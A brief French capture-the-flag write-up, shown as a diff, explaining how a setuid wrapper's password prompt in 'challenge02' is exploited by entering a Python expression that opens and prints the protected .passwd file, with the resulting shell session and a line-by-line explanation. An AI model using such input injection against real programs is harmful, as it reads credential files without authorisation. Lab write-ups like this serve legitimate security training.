@@ -1,0 +1,13 @@
+Ma solution utilise la ligne suivante :
+
+ sys.stdout.write(open(".passwd").readline())
+#####################################################
+    @challenge02:~$ ./setuid-wrapper 
+    Please enter password : sys.stdout.write(open(".passwd").readline())   
+    LE FLAG EST ICI ^^
+
+Expliquations de la commande : 
+
+    sys.stdout.write() : permet d’écrire sur la sortie standard stdout
+    open(".passwd") : ouvre le fichier .passwd
+    readline() : lit une ligne du fichier
